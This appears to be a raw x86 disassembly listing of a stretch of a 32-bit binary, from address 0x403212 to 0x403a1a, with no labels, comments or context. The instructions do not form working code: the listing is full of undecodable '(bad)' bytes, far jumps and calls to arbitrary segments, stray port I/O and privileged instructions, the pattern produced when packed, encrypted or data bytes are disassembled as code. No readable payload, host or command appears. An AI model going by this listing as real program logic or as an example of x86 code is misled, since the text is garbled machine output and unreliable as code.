  403212:	test   DWORD PTR [esi+0x6b],0xf319499a
  403219:	adc    esp,DWORD PTR [ebx+0x7b]
  40321c:	call   0xf7dd4e26
  403221:	fsub   st(4),st
  403223:	je     0x4031de
  403225:	adc    DWORD PTR [ebx],eax
  403227:	cmc    
  403228:	jae    0x4031ff
  40322a:	mov    ds:0x3373e075,al
  40322f:	inc    eax
  403230:	out    dx,al
  403231:	mov    esi,0x6a644757
  403236:	push   es
  403237:	mov    ebx,0x75e7c4bf
  40323c:	fisttp DWORD PTR [esi-0x3c]
  40323f:	push   es
  403240:	in     al,dx
  403241:	add    eax,0x71645270
  403246:	sbb    eax,0xa00a1aee
  40324b:	or     al,0xf5
  40324d:	loopne 0x4032aa
  40324f:	sub    ebp,ebx
  403251:	ins    BYTE PTR es:[edi],dx
  403252:	add    ah,BYTE PTR [edi-0x69]
  403255:	jle    0x403228
  403257:	mov    dl,0xa8
  403259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40325a:	push   ds
  40325b:	xchg   esp,eax
  40325c:	mov    edx,0xbd6d2101
  403261:	inc    ecx
  403262:	mov    ds:0x608f529d,al
  403267:	xchg   BYTE PTR [ebx],dh
  403269:	into   
  40326a:	das    
  40326b:	mov    gs,WORD PTR [ebx]
  40326d:	bound  ecx,QWORD PTR [esi+0x44bc26b7]
  403273:	stos   BYTE PTR es:[edi],al
  403274:	leave  
  403275:	or     DWORD PTR [edi],esi
  403277:	fsub   st(1),st
  403279:	cmp    BYTE PTR [esi+edx*8+0x5ccec7bf],bl
  403280:	scas   al,BYTE PTR es:[edi]
  403281:	outs   dx,DWORD PTR ds:[esi]
  403282:	dec    ecx
  403283:	or     al,0x49
  403285:	cmp    BYTE PTR [esi],cl
  403287:	fld    DWORD PTR [esi]
  403289:	jbe    0x40326b
  40328b:	add    dh,BYTE PTR [ebp-0x6785d3b7]
  403291:	add    al,0x39
  403293:	jmp    0x419bbf3a
  403298:	retf   
  403299:	cs icebp 
  40329b:	fnsave [edi]
  40329d:	(bad)  
  40329e:	sub    eax,0x7fa2b158
  4032a3:	inc    eax
  4032a4:	sbb    dl,BYTE PTR [edx-0xe5d7f9e]
  4032aa:	dec    ecx
  4032ab:	out    dx,al
  4032ac:	xchg   ebp,edx
  4032ae:	cmp    esi,DWORD PTR [ecx+edx*1]
  4032b1:	push   edi
  4032b2:	sub    BYTE PTR [eax],cl
  4032b4:	cmp    al,0x52
  4032b6:	adc    eax,0x986ee2cf
  4032bb:	mov    bl,BYTE PTR ds:0x98d8b611
  4032c1:	sub    BYTE PTR [edi+0x2f],0xe5
  4032c5:	mov    eax,0xb8f1d610
  4032ca:	jno    0x40332b
  4032cc:	xchg   ebp,eax
  4032cd:	dec    ebx
  4032ce:	hlt    
  4032cf:	faddp  st(1),st
  4032d1:	adc    DWORD PTR [esi-0x77],edi
  4032d4:	push   eax
  4032d5:	outs   dx,DWORD PTR ds:[esi]
  4032d6:	xor    eax,0x1bdf65a3
  4032db:	out    0xc2,al
  4032dd:	nop
  4032de:	push   ebx
  4032df:	add    BYTE PTR [ebp-0x79145fbc],cl
  4032e5:	lock sbb al,ah
  4032e8:	push   eax
  4032e9:	icebp  
  4032ea:	and    esi,ebx
  4032ec:	out    0xc4,al
  4032ee:	in     eax,0x0
  4032f0:	jge    0x4032bc
  4032f2:	xor    al,0x4a
  4032f4:	ins    DWORD PTR es:[edi],dx
  4032f5:	imul   ecx,DWORD PTR [edx+edi*1-0x6c12855e],0xd7ed9865
  403300:	mov    eax,ds:0x32d3ba0e
  403305:	dec    ebx
  403306:	stc    
  403307:	daa    
  403308:	mov    esi,0xe9c7d81c
  40330d:	outs   dx,BYTE PTR ds:[esi]
  40330e:	xchg   DWORD PTR [edi],ebp
  403310:	mov    eax,ds:0xed83110
  403315:	pop    es
  403316:	ins    BYTE PTR es:[edi],dx
  403317:	sub    eax,0xdb61754d
  40331c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40331d:	lods   al,BYTE PTR ds:[esi]
  40331e:	and    ch,BYTE PTR [eax+ecx*1+0x10d37525]
  403325:	dec    esi
  403326:	push   esp
  403327:	(bad)  [esi+0x6]
  40332a:	ins    DWORD PTR es:[edi],dx
  40332b:	sbb    BYTE PTR [eax+0x40],bh
  40332e:	mov    bl,0xc6
  403331:	sbb    ecx,ebp
  403333:	or     eax,0xfc3cfecd
  403338:	mov    ds:0xbac763be,eax
  40333d:	and    ebx,DWORD PTR [eax+ebp*1]
  403340:	mov    al,ds:0x418ff2c9
  403345:	cwde   
  403346:	push   edx
  403347:	jg     0x403321
  403349:	mov    ch,0xd6
  40334b:	lahf   
  40334c:	call   0x6a0139f7
  403351:	gs and al,0xcd
  403354:	pop    eax
  403355:	inc    ebx
  403356:	add    DWORD PTR [ebx-0xc],edx
  403359:	(bad)  
  40335a:	in     al,0xfe
  40335c:	sub    BYTE PTR [ebx],0xa8
  40335f:	fcom   QWORD PTR [edx-0x74f9d0af]
  403365:	add    cl,BYTE PTR [ebp-0x1f5ca231]
  40336b:	push   es
  40336c:	or     al,0xde
  40336e:	std    
  40336f:	or     eax,0x6dd2f522
  403374:	out    0x5c,eax
  403376:	js     0x4033d0
  403378:	scas   al,BYTE PTR es:[edi]
  403379:	js     0x4033b3
  40337b:	push   ebx
  40337c:	fdiv   DWORD PTR [eax+0xcafc66c]
  403382:	adc    eax,0xa6db1e57
  403387:	xor    al,0xa
  403389:	or     bh,dl
  40338b:	jge    0x4033b8
  40338d:	jmp    0xdfda:0xd4ce6d70
  403394:	mov    DWORD PTR [ebp+0x38],eax
  403397:	fld    QWORD PTR [edx+0x38]
  40339a:	push   esp
  40339b:	loopne 0x4033b4
  40339d:	lods   eax,DWORD PTR es:[esi]
  40339f:	shl    BYTE PTR [edx+edi*4+0x11],0xfe
  4033a4:	push   edx
  4033a5:	std    
  4033a6:	mov    dh,0x11
  4033a8:	scas   al,BYTE PTR es:[edi]
  4033a9:	ror    BYTE PTR [edi],cl
  4033ab:	push   ds
  4033ac:	imul   ecx,ebx,0x7db45518
  4033b2:	cmp    BYTE PTR [ebx-0x21],dl
  4033b5:	jae    0x40335d
  4033b7:	xchg   esp,eax
  4033b8:	call   0x332571c7
  4033bd:	sbb    ebx,ecx
  4033bf:	add    esi,DWORD PTR [ebx+esi*1]
  4033c2:	test   al,0xf7
  4033c4:	cmp    eax,edi
  4033c6:	mov    esp,0x98badb20
  4033cb:	popf   
  4033cc:	jg     0x4033ab
  4033ce:	rcr    ebx,1
  4033d0:	mov    edi,edi
  4033d2:	jb     0x4033a2
  4033d4:	ficomp DWORD PTR [esi-0x78e62d79]
  4033da:	pop    esi
  4033db:	ins    BYTE PTR es:[edi],dx
  4033dc:	ins    DWORD PTR es:[edi],dx
  4033dd:	push   edx
  4033de:	scas   eax,DWORD PTR es:[edi]
  4033df:	test   ebx,esp
  4033e1:	xor    edx,edi
  4033e3:	push   esi
  4033e4:	(bad)  
  4033e5:	lds    ecx,FWORD PTR [ebp-0x7d]
  4033e8:	dec    ebp
  4033e9:	aad    0xf5
  4033eb:	(bad)  
  4033ec:	mov    gs,WORD PTR [esi+0x4dfece40]
  4033f2:	aas    
  4033f3:	mov    edi,DWORD PTR [edx-0x4a286138]
  4033f9:	mov    eax,0x231acc5f
  4033fe:	push   edi
  4033ff:	jno    0x40346d
  403401:	sbb    esi,DWORD PTR [edi+0x3ff004e0]
  403407:	pop    ebp
  403408:	inc    edx
  403409:	test   al,0xd7
  40340b:	inc    ecx
  40340c:	popf   
  40340d:	aad    0xc4
  40340f:	outs   dx,BYTE PTR ds:[esi]
  403410:	test   al,0x6e
  403412:	ss inc ebx
  403414:	enter  0x49fc,0x35
  403418:	push   ebx
  403419:	dec    eax
  40341a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341b:	cmp    dh,BYTE PTR [esi+0x5fb672ae]
  403421:	push   0xffffffc8
  403423:	test   DWORD PTR ds:[eax+0x69],ebx
  403427:	cmp    al,0xd9
  403429:	adc    al,0x88
  40342b:	xchg   esp,eax
  40342c:	cmc    
  40342d:	sahf   
  40342e:	mov    ecx,0xdf8422c7
  403433:	mov    al,ds:0x924eaa19
  403438:	call   0xae05c4d3
  40343d:	fs cmp dh,0xd7
  403441:	sbb    ebp,DWORD PTR [edx-0x6a4112a1]
  403447:	xor    esp,DWORD PTR [edi-0x3467314d]
  40344d:	xchg   edx,eax
  40344e:	jnp    0x403430
  403450:	repz sbb BYTE PTR [ebx],bh
  403453:	fimul  DWORD PTR [edi+0x752d2508]
  403459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40345a:	push   esp
  40345b:	fxch   st(7)
  40345d:	inc    esp
  40345e:	rcr    bl,1
  403460:	xchg   ecx,eax
  403461:	pop    edx
  403462:	mov    edx,DWORD PTR [ebx+0x41]
  403465:	scas   eax,DWORD PTR es:[edi]
  403466:	ror    BYTE PTR ds:0x17072cdb,0xb
  40346d:	repz jle 0x403480
  403470:	fwait
  403471:	or     bl,BYTE PTR [esi]
  403473:	jle    0x4034dd
  403475:	jge    0x4034d1
  403477:	lahf   
  403478:	in     al,0xaa
  40347a:	leave  
  40347b:	xor    al,0x9b
  40347d:	leave  
  40347e:	daa    
  40347f:	jl     0x40346a
  403481:	sahf   
  403482:	xor    BYTE PTR [esi-0x2d],dh
  403485:	imul   esp,DWORD PTR [ecx+0x19],0x1d
  403489:	lds    ebx,FWORD PTR [eiz*1-0x7bce01a4]
  403490:	stc    
  403491:	xchg   edx,eax
  403492:	add    ebx,esi
  403494:	cmp    bh,BYTE PTR [edi-0x34d17f82]
  40349a:	(bad)  
  40349b:	stos   DWORD PTR es:[edi],eax
  40349c:	aaa    
  40349d:	ret    
  40349e:	cmp    DWORD PTR [edx],0x134082d
  4034a4:	xchg   esi,eax
  4034a5:	rol    ebp,0x7e
  4034a8:	inc    esp
  4034a9:	into   
  4034aa:	xchg   ebx,eax
  4034ab:	in     al,0x3b
  4034ad:	repz pop esi
  4034af:	sub    DWORD PTR [ecx],edx
  4034b1:	jmp    0x403462
  4034b3:	sti    
  4034b4:	adc    dh,BYTE PTR [ebx]
  4034b6:	mov    ds:0xaa4132f7,al
  4034bb:	and    DWORD PTR [edi],ebp
  4034bd:	stc    
  4034be:	adc    DWORD PTR ds:0xec5d3e71,0xc76ec3fa
  4034c8:	test   esi,0x99641cc2
  4034ce:	enter  0x4e09,0x8c
  4034d2:	and    BYTE PTR [eax-0x68],bh
  4034d5:	leave  
  4034d6:	jge    0x4034b7
  4034d8:	mov    esi,DWORD PTR [edx+0x41]
  4034db:	pop    es
  4034dc:	xor    al,0x42
  4034de:	(bad)  
  4034df:	arpl   WORD PTR [ebx-0x6f2776e9],bp
  4034e5:	rcr    ebp,0x40
  4034e8:	icebp  
  4034e9:	(bad)  
  4034ea:	ds ss clc 
  4034ed:	mov    dh,0xea
  4034ef:	sbb    eax,0x93c8f631
  4034f4:	pusha  
  4034f5:	fsubr  DWORD PTR [ebp+0x2be49ea6]
  4034fb:	or     ch,ah
  4034fd:	mov    dh,0x7
  4034ff:	cmp    eax,0x3168c866
  403504:	and    esp,ebx
  403506:	mov    DWORD PTR [ebx+0x32],edx
  403509:	cs jo  0x4034f1
  40350c:	adc    ebp,DWORD PTR [esi-0x361f95db]
  403512:	rcr    BYTE PTR fs:[eax],1
  403515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403516:	push   cs
  403517:	pop    ecx
  403518:	hlt    
  403519:	push   ebp
  40351a:	mov    ds:0x36d1db2c,al
  40351f:	fiadd  WORD PTR [ebx-0x3c]
  403522:	xchg   DWORD PTR [eax+0x71509f5e],edi
  403528:	mov    eax,ds:0x6f79a2a6
  40352d:	test   BYTE PTR [edx-0x29],bl
  403530:	push   0x66643dab
  403535:	cdq    
  403536:	(bad)  
  403537:	sbb    cl,BYTE PTR [esi+ebx*1]
  40353a:	in     al,0x8d
  40353c:	xor    ebx,ecx
  40353e:	das    
  40353f:	adc    DWORD PTR [edi],0x87bf7cc8
  403545:	(bad)  
  403547:	jge    0x40355f
  403549:	push   esi
  40354a:	and    bh,BYTE PTR [ebp+0x71]
  40354d:	xchg   BYTE PTR [edx-0x41bf2187],dl
  403553:	xchg   ebp,eax
  403554:	mov    dl,0xe6
  403556:	mov    al,BYTE PTR [edi+0x6e17f43c]
  40355c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40355d:	mov    ecx,0xb3bf7ad3
  403562:	mov    ecx,0xe232a002
  403567:	bound  edi,QWORD PTR ds:0x23ced277
  40356d:	xchg   ebx,eax
  40356e:	aam    0x76
  403570:	cwde   
  403571:	retf   
  403572:	pop    esi
  403573:	xor    al,0xed
  403575:	push   esp
  403576:	out    dx,al
  403577:	(bad)  [edx-0x5317ab99]
  40357d:	cmp    BYTE PTR [edx-0x52165a01],0x36
  403584:	ja     0x403576
  403586:	lea    eax,[eax+0x22ce504]
  40358c:	jge    0x4035aa
  40358e:	xor    al,0x6c
  403590:	push   ebx
  403591:	lods   eax,DWORD PTR ds:[esi]
  403592:	or     eax,0x1845e019
  403597:	pop    ds
  403598:	sbb    al,0xa2
  40359a:	cmp    eax,0x6523e7ae
  40359f:	call   0xb525:0x7a8f9229
  4035a6:	jbe    0x40358e
  4035a8:	mov    ah,0xf4
  4035aa:	das    
  4035ab:	mov    al,ds:0x59022b42
  4035b0:	arpl   WORD PTR [ebp-0x29f695e6],si
  4035b6:	mov    eax,ds:0x5c22fe49
  4035bb:	mov    bh,ch
  4035bd:	mov    bl,0xb5
  4035bf:	push   ss
  4035c0:	push   es
  4035c1:	push   edx
  4035c2:	fdiv   st,st(0)
  4035c4:	add    esi,DWORD PTR [edx+ebx*2-0x37]
  4035c8:	leave  
  4035c9:	jecxz  0x40360f
  4035cb:	shl    DWORD PTR [ecx+0xe8b210f],cl
  4035d1:	stos   BYTE PTR es:[edi],al
  4035d2:	cwde   
  4035d3:	cdq    
  4035d4:	cwde   
  4035d5:	in     eax,0x64
  4035d7:	sbb    al,0xf4
  4035d9:	out    dx,al
  4035da:	popa   
  4035db:	test   eax,esi
  4035dd:	into   
  4035de:	loop   0x4035c6
  4035e0:	xor    ebx,DWORD PTR [edx+esi*1]
  4035e3:	bound  ebx,QWORD PTR [ecx-0x35f96f0f]
  4035e9:	les    eax,FWORD PTR [edi+0x50]
  4035ec:	xchg   ecx,eax
  4035ed:	shl    ebp,0x10
  4035f0:	and    al,0x64
  4035f2:	cmc    
  4035f3:	add    DWORD PTR [ecx+0x5d],ebx
  4035f6:	push   esp
  4035f7:	rol    DWORD PTR [edi-0x12],1
  4035fa:	sti    
  4035fb:	jo     0x403676
  4035fd:	pop    ebx
  4035fe:	push   0x28339b28
  403603:	mov    WORD PTR [ecx+edi*1],ss
  403606:	mov    ebp,0xba54b6ea
  40360b:	sahf   
  40360c:	bound  eax,QWORD PTR [eax]
  40360e:	aam    0xea
  403610:	inc    esi
  403611:	stos   BYTE PTR es:[edi],al
  403612:	sbb    DWORD PTR [edx+ebp*2],ebp
  403615:	pop    esi
  403616:	cwde   
  403617:	mov    dl,0x6c
  403619:	add    al,0x3f
  40361b:	(bad)  
  40361c:	mov    dl,0x61
  40361e:	sbb    eax,0xef39bbc1
  403623:	add    eax,0x553a9a56
  403628:	cmp    dh,BYTE PTR [ebx]
  40362a:	mov    al,0x9f
  40362c:	jae    0x4035ed
  40362e:	xor    al,0x8
  403630:	mov    dl,0x85
  403632:	cld    
  403633:	fst    QWORD PTR [edx-0x32]
  403636:	fwait
  403637:	pop    es
  403638:	dec    ebp
  403639:	mov    ah,0xb9
  40363b:	scas   al,BYTE PTR es:[edi]
  40363c:	mov    eax,0x1f136e0f
  403641:	sub    ebx,edx
  403643:	cmp    al,0x74
  403645:	cmp    al,0xb9
  403647:	lds    eax,FWORD PTR [esi]
  403649:	aaa    
  40364a:	jecxz  0x403695
  40364c:	push   ecx
  40364d:	js     0x4036b0
  40364f:	cmc    
  403650:	add    eax,0x7f9b6810
  403655:	adc    al,0x8
  403657:	bound  esp,QWORD PTR [ebp-0x5411e55f]
  40365d:	xor    ah,BYTE PTR [esi-0x46]
  403660:	cmp    ah,BYTE PTR [edi]
  403662:	rcl    BYTE PTR [ebx],0x89
  403665:	xor    eax,0xdfb25f9
  40366a:	je     0x40363b
  40366c:	adc    eax,0x5fde882c
  403671:	clc    
  403672:	mov    edi,0x7599efc5
  403677:	nop
  403678:	add    eax,0xba270a9e
  40367d:	xor    al,0x93
  40367f:	cmp    bl,BYTE PTR [ebx+0x26]
  403682:	mov    cl,0x14
  403684:	iret   
  403685:	sub    BYTE PTR [ecx+0x2c],0x3
  403689:	shl    cl,1
  40368b:	arpl   WORD PTR [edi-0x73],ax
  40368e:	mov    ah,0x7
  403690:	or     esi,DWORD PTR [ebx+0x14887219]
  403696:	mov    al,0xdb
  403698:	int3   
  403699:	push   cs
  40369a:	inc    ebx
  40369b:	mov    ds:0xe904735a,al
  4036a0:	call   0x5bc1:0x784be68b
  4036a7:	ret    0x3729
  4036aa:	mov    eax,ds:0xc969cdb5
  4036af:	les    eax,FWORD PTR [ebp+0x6b38302b]
  4036b5:	ret    0xebde
  4036b8:	into   
  4036b9:	mov    ebx,0xf5d40b30
  4036be:	mov    dh,0xdc
  4036c0:	iret   
  4036c1:	pop    ebp
  4036c2:	add    bh,0x31
  4036c5:	sub    esp,DWORD PTR [edi-0x2b]
  4036c8:	stos   DWORD PTR es:[edi],eax
  4036c9:	add    esi,ebx
  4036cb:	sbb    al,0x73
  4036cd:	(bad)  
  4036ce:	adc    BYTE PTR [ebp+eiz*4+0x75d4145f],dh
  4036d5:	jl     0x403659
  4036d7:	fisubr DWORD PTR [eax+0x5ff7545]
  4036dd:	pop    ds
  4036de:	push   ebx
  4036df:	dec    esi
  4036e0:	xchg   esp,eax
  4036e1:	or     BYTE PTR [esi+0x35],dh
  4036e4:	push   ecx
  4036e5:	mov    gs,edi
  4036e7:	mov    DWORD PTR [ebx-0x7f],edx
  4036ea:	mov    dh,0xf9
  4036ec:	pop    ebp
  4036ed:	push   DWORD PTR [ecx]
  4036ef:	jecxz  0x403725
  4036f1:	xchg   ebx,eax
  4036f2:	js     0x403688
  4036f4:	jl     0x40370d
  4036f6:	repnz outs dx,BYTE PTR ds:[esi]
  4036f8:	sub    dl,cl
  4036fa:	call   0x4875:0xe97de7fc
  403701:	mov    edi,0xa338828
  403706:	mov    al,0xa4
  403708:	lock mov WORD PTR fs:[ecx+0x66],fs
  40370d:	jmp    0x5b04:0x8c6a2f5c
  403714:	adc    eax,0xbb1232c6
  403719:	mov    edx,0x8e2f20b8
  40371e:	(bad)  
  40371f:	data16 loopne 0x4036c0
  403722:	jp     0x403772
  403724:	data16 shl BYTE PTR [ebp-0x1a7d962c],cl
  40372b:	int    0xc5
  40372d:	mov    ch,BYTE PTR [eax-0x4416918b]
  403733:	aad    0xa5
  403735:	and    ah,bh
  403737:	and    al,0xc9
  403739:	cmp    eax,0xc33bf519
  40373e:	sahf   
  40373f:	push   cs
  403740:	and    BYTE PTR [ebx+0x11],0x43
  403744:	in     eax,0x8c
  403746:	inc    esp
  403747:	adc    BYTE PTR [ecx-0x61],ah
  40374a:	pop    ss
  40374b:	or     edi,DWORD PTR [edx+0x5b]
  40374e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40374f:	mov    cl,0x20
  403751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403752:	leave  
  403753:	test   BYTE PTR [esi+esi*2],cl
  403756:	fistp  DWORD PTR [ebx+eiz*2-0x5d]
  40375a:	add    ebx,DWORD PTR [edx]
  40375c:	xor    BYTE PTR [esi+0x5e4c75f2],dh
  403762:	les    edi,FWORD PTR [esi-0x76]
  403765:	cmp    eax,0x4f2b1719
  40376a:	mov    ah,BYTE PTR [esp+ebp*8]
  40376d:	push   ecx
  40376e:	cmp    al,0xf7
  403770:	jnp    0x40379d
  403772:	push   esp
  403773:	cmc    
  403774:	(bad)  
  403775:	or     al,0xbf
  403777:	retf   
  403778:	jo     0x403717
  40377a:	pop    ebp
  40377b:	ficom  DWORD PTR [ecx-0x471ae26b]
  403781:	push   ecx
  403782:	inc    esp
  403783:	fstp   st(3)
  403785:	cs loop 0x4037b6
  403788:	lock lock push ds
  40378b:	test   edx,edx
  40378d:	les    ebp,FWORD PTR [ebx+0x5c]
  403790:	sub    DWORD PTR [edx],0x6c
  403793:	and    eax,0x91d001b5
  403798:	nop
  403799:	mov    bh,0x43
  40379b:	daa    
  40379c:	fcomp  DWORD PTR [ebx-0x61]
  40379f:	sub    BYTE PTR [ebp+0x68],dh
  4037a2:	push   ebx
  4037a3:	and    eax,DWORD PTR [edi+edx*1+0x2247ca81]
  4037aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ab:	(bad)  
  4037ac:	outs   dx,DWORD PTR ds:[esi]
  4037ad:	rcr    ebp,0x7
  4037b0:	retf   
  4037b1:	stos   BYTE PTR es:[edi],al
  4037b2:	push   0x763e2e8b
  4037b7:	outs   dx,BYTE PTR ds:[esi]
  4037b8:	std    
  4037b9:	xor    bl,dh
  4037bb:	pop    edx
  4037bc:	call   0x6a36:0x812552b1
  4037c3:	ret    0x9493
  4037c6:	mov    bl,0x1a
  4037c8:	pusha  
  4037c9:	sbb    eax,0xb214a83a
  4037ce:	(bad)  
  4037cf:	mov    ecx,0x1146c9be
  4037d4:	mov    ecx,DWORD PTR [bp+di+0x1c]
  4037d8:	sbb    DWORD PTR [esi+0x6533a52e],esi
  4037de:	fwait
  4037df:	dec    esp
  4037e0:	out    dx,al
  4037e1:	lods   eax,DWORD PTR ds:[esi]
  4037e2:	xchg   ecx,eax
  4037e3:	out    dx,al
  4037e4:	pushf  
  4037e5:	fild   WORD PTR [edi-0x2a]
  4037e8:	mov    esi,0x6ee108f9
  4037ed:	xchg   ebp,eax
  4037ee:	add    BYTE PTR [eax-0xf9d79c0],ch
  4037f4:	pop    ss
  4037f5:	and    BYTE PTR [ebx+0x4675657d],bl
  4037fb:	cmp    BYTE PTR [esi-0x2d],ah
  4037fe:	push   ebp
  4037ff:	out    dx,al
  403800:	jecxz  0x4037fd
  403802:	icebp  
  403803:	mov    ebx,0x49b6d4a7
  403808:	xor    eax,0x83e4f073
  40380d:	inc    ebp
  40380e:	pop    esi
  40380f:	loopne 0x4037d5
  403811:	mov    ecx,0x306a76b1
  403816:	xchg   DWORD PTR [ebx],esp
  403818:	(bad)  
  403819:	fisubr WORD PTR [ecx]
  40381b:	sub    DWORD PTR [esi-0x44],0x4a7cd3a1
  403822:	and    al,0xd6
  403824:	xchg   edi,eax
  403825:	(bad)  
  403826:	jmp    0x510f:0xe9e0dd66
  40382d:	inc    esi
  40382e:	pop    ss
  40382f:	inc    esp
  403830:	sbb    BYTE PTR [eax],0xe1
  403833:	adc    ebx,DWORD PTR [ecx+0x4d]
  403836:	mov    ebx,0xee6175c5
  40383b:	dec    eax
  40383c:	addr16 jmp 0x8e1c:0xac25563f
  403844:	pop    ebp
  403845:	sbb    eax,0x714739ad
  40384a:	push   esp
  40384b:	add    esp,0x4d
  40384e:	addr16 out dx,eax
  403850:	fisubr WORD PTR [edi*8+0x22385013]
  403857:	dec    edi
  403858:	jb     0x403854
  40385a:	mov    WORD PTR [edx*8-0x550f1531],cs
  403861:	or     bh,BYTE PTR [esi+0x0]
  403864:	(bad)  
  403865:	inc    esi
  403866:	xor    bh,al
  403868:	ds push edi
  40386a:	test   eax,0x8208c93a
  40386f:	fadd   st,st(0)
  403871:	fstp   TBYTE PTR [ecx+0x60ae994a]
  403877:	retf   
  403878:	aaa    
  403879:	inc    edi
  40387a:	hlt    
  40387b:	adc    esp,edi
  40387d:	xor    al,0x67
  40387f:	aas    
  403880:	dec    esp
  403881:	ja     0x4038eb
  403883:	push   esp
  403884:	sti    
  403885:	(bad)  
  403886:	xchg   esi,eax
  403887:	popa   
  403888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403889:	sbb    ch,BYTE PTR [ecx+0x1c]
  40388c:	retf   
  40388d:	sub    al,0x42
  40388f:	test   eax,0xc63e8e84
  403894:	ins    BYTE PTR es:[edi],dx
  403895:	(bad)  
  403896:	cld    
  403897:	or     ch,bh
  403899:	inc    edi
  40389a:	mov    esp,0x8559fdc5
  40389f:	add    eax,DWORD PTR [ecx]
  4038a1:	sar    bh,0x63
  4038a4:	push   cs
  4038a5:	cmp    al,0x9a
  4038a7:	lock pop ebx
  4038a9:	mov    WORD PTR [ecx-0x43],ds
  4038ac:	aaa    
  4038ad:	cmp    eax,0x377f1a7a
  4038b2:	outs   dx,BYTE PTR ds:[esi]
  4038b3:	dec    edi
  4038b4:	inc    esi
  4038b5:	mov    edx,0x5c8537c4
  4038ba:	jne    0x403867
  4038bc:	rcr    DWORD PTR [esi-0xa],1
  4038bf:	and    al,0x73
  4038c1:	nop
  4038c2:	out    dx,eax
  4038c3:	out    0x7d,eax
  4038c5:	div    ebx
  4038c7:	or     al,0xcb
  4038c9:	mov    ah,0x27
  4038cb:	xor    ecx,esi
  4038cd:	fisub  WORD PTR [ebp+esi*4-0x6e]
  4038d1:	dec    ebp
  4038d2:	mov    edx,ebp
  4038d4:	(bad)  
  4038d5:	mov    DWORD PTR [eax-0x39],edx
  4038d8:	jecxz  0x40394c
  4038da:	js     0x403897
  4038dc:	adc    al,BYTE PTR [esi+0x2058660e]
  4038e2:	mov    ds,WORD PTR [ebp+0x10]
  4038e5:	lods   eax,DWORD PTR ds:[esi]
  4038e6:	inc    edx
  4038e7:	(bad)  
  4038e8:	pop    eax
  4038e9:	and    cl,BYTE PTR [ecx]
  4038eb:	imul   edi,DWORD PTR [edx],0x5d
  4038ee:	call   0xb2e18dfc
  4038f3:	ja     0x403877
  4038f5:	or     BYTE PTR [edi+edi*1],dh
  4038f8:	out    0xe2,al
  4038fa:	fisubr DWORD PTR [esi+0x2e2838e5]
  403900:	push   edi
  403901:	loope  0x403961
  403903:	arpl   WORD PTR [ebx+0x6f00d167],bx
  403909:	ret    
  40390a:	mov    dl,BYTE PTR [ebp+esi*2+0x346e31e2]
  403911:	mov    esi,0xc589eb8
  403916:	pop    esi
  403917:	pushf  
  403918:	bound  esi,QWORD PTR ss:[edi-0x1]
  40391c:	mov    DWORD PTR [edx-0xfc9be1b],ebp
  403922:	jbe    0x403900
  403924:	add    ebx,DWORD PTR [ecx+0x1f]
  403927:	pop    ebx
  403928:	and    esp,DWORD PTR ds:0x7efc6ae
  40392e:	jno    0x4039a9
  403930:	xchg   ecx,eax
  403931:	mov    es:0xeff90b09,al
  403937:	fstp   st(1)
  403939:	cwde   
  40393a:	push   ds
  40393b:	dec    ebx
  40393c:	popf   
  40393d:	sub    ebx,DWORD PTR [eax+0x39fdd547]
  403943:	popf   
  403944:	pop    edx
  403945:	lock adc BYTE PTR [edx],dh
  403948:	enter  0x48da,0xfe
  40394c:	int3   
  40394d:	jne    0x40396e
  40394f:	addr16 dec ebp
  403951:	add    ebp,DWORD PTR [edx-0x34509a01]
  403957:	imul   ebx,ebx,0x3
  40395a:	loop   0x4038f0
  40395c:	adc    cl,BYTE PTR [ecx+esi*8-0x307923b7]
  403963:	push   ebp
  403964:	test   BYTE PTR [ebx-0x7],bl
  403967:	ror    DWORD PTR [edi-0x4e852ae4],1
  40396d:	mov    DWORD PTR [ebp-0x4a1b1bea],esi
  403973:	ds jns 0x403940
  403976:	(bad)  
  403977:	(bad)  
  403978:	lds    eax,FWORD PTR [eax+0x5a9d1ad4]
  40397e:	(bad)  
  403980:	into   
  403981:	outs   dx,DWORD PTR ds:[esi]
  403982:	imul   ebx,DWORD PTR es:[ebp-0x29c0bd0],0x11ec6f31
  40398d:	jmp    0x993f87b5
  403992:	push   edx
  403993:	fmul   DWORD PTR [ebx-0x426560cb]
  403999:	retf   0x2820
  40399c:	int3   
  40399d:	inc    edx
  40399e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40399f:	jp     0x40393d
  4039a1:	and    eax,0x5c10b79
  4039a6:	inc    esp
  4039a7:	push   ecx
  4039a8:	or     BYTE PTR [eax-0x3e],cl
  4039ab:	retf   
  4039ac:	add    DWORD PTR ds:0x10a8ed03,ebx
  4039b2:	xchg   ah,dh
  4039b4:	sub    BYTE PTR [ebp+0x1704a77b],dh
  4039ba:	or     DWORD PTR [eax+ebp*8-0x5e],edi
  4039be:	(bad)  
  4039bf:	jmp    0x1b60bc9
  4039c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039c5:	(bad)  
  4039c6:	call   0x5310:0x47bc0c3f
  4039cd:	out    dx,al
  4039ce:	cmc    
  4039cf:	mov    ecx,0x362aeb9c
  4039d4:	ds ret 
  4039d6:	add    BYTE PTR [esi+0x3eccacae],dl
  4039dc:	sub    cl,BYTE PTR [ebx+0x2d]
  4039df:	xchg   ebp,eax
  4039e0:	popf   
  4039e1:	jl     0x4039d7
  4039e3:	cmp    eax,0xc729042f
  4039e8:	out    dx,eax
  4039e9:	js     0x403a14
  4039eb:	adc    DWORD PTR [edi+0x5f308294],edi
  4039f1:	push   edx
  4039f2:	out    0xe2,al
  4039f4:	pop    ds
  4039f5:	(bad)  
  4039f6:	stc    
  4039f7:	mov    bh,0xf6
  4039f9:	or     al,0xc7
  4039fb:	enter  0x8ae8,0x11
  4039ff:	push   ebx
  403a00:	cld    
  403a01:	fcmovb st,st(3)
  403a03:	add    BYTE PTR [esp+ecx*1+0x64023617],ch
  403a0a:	lds    esi,FWORD PTR [edi+0x294e3a6]
  403a10:	cmp    DWORD PTR [ebx+0x2f38342d],0x2d465f73
  403a1a:	adc    eax,0x3efb77ff
